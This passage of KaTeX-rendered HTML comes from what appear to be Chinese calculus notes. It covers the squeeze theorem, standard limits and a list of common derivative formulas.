encoding="application/x-tex">\lim_{x \rightarrow a}f(x)\leq \lim_{x \rightarrow a}{g(x)}\leq \lim_{x \rightarrow a}{h(x)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mathdefault mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mathdefault mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mathdefault mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></span></p></li><li><p>重要极限</p><ul><li>三角函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mn>0</mn></mrow></msub><mfrac><mrow><mi>sin</mi><mo>⁡</mo><mi>x</mi></mrow><mi>x</mi></mfrac><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lim_{x \rightarrow 0}\frac{\sin{x}}{x}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.206502em;vertical-align:-0.345em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.861502em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop mtight">sin</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li><li>自然对数底数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></msub><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">\lim_{x \rightarrow \infty}(1+\frac{1}{n})^n=e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">e</span></span></span></span></li><li>指数函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>x</mi><mo>→</mo><mn>0</mn></mrow></msub><mfrac><mrow><msup><mi>e</mi><mi>x</mi></msup><mo>−</mo><mn>1</mn></mrow><mi>x</mi></mfrac><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lim_{x \rightarrow 0}\frac{e^x-1}{x}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.25598em;vertical-align:-0.345em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.91098em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></li></ul></li><li><p>洛必达法则</p></li></ul><h3 id="求导数"><a class="markdownIt-Anchor" href="#求导数"></a> 求导数</h3><ul><li>一阶导数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi mathvariant="normal">Δ</mi><mo>→</mo><mn>0</mn></mrow></msub><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">Δ</mi></mfrac></mrow><annotation encoding="application/x-tex">f&#x27;(x)=\lim_{\Delta\rightarrow 0}\frac{f(x+\Delta)-f(x)}{\Delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mtight">Δ</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>几何意义：用直线逼近曲线</li><li>代数意义：用线性函数逼近复杂函数</li><li>常见函数导数<ul><li>多项式导数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>x</mi><mi>n</mi></msup><mo>=</mo><mi>n</mi><mo>⋅</mo><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\frac{d}{dx}x^n=n\cdot x^{n-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></li><li>三角函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>sin</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>cos</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{d}{dx}\sin(x)=\cos(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">sin</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">cos</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span></li><li>指数函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>e</mi><mi>x</mi></msup><mo>=</mo><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">\frac{d}{dx}e^x=e^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext> </mtext></mrow><annotation encoding="application/x-tex">\:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>a</mi><mi>x</mi></msup><mo>=</mo><msup><mi>a</mi><mi>x</mi></msup><mo>⋅</mo><mi>ln</mi><mo>⁡</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">\frac{d}{dx}a^x=a^x\cdot \ln a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span></span></span></span></li><li>幂导数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>x</mi><mi>α</mi></msup><mo>=</mo><mi>α</mi><mo>⋅</mo><msup><mi>x</mi><mrow><mi>α</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\frac{d}{dx}x^\alpha =\alpha \cdot x^{\alpha-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.0037em;">α</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.0037em;">α</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></li><li>对数导数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>ln</mi><mo>⁡</mo><mi>x</mi><mo>=</mo><mfrac><mn>1</mn><mi>x</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{d}{dx}\ln x = \frac{1}{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li><li>复杂导数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><msup><mi>x</mi><mi>x</mi></msup><mo>=</mo><msup><mi>x</mi><mi>x</mi></msup><mo>⋅</mo><mo stretchy="false">(</mo><mi>ln</mi><mo>⁡</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\frac{d}{dx}x^x = x^x \cdot (\ln x +1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 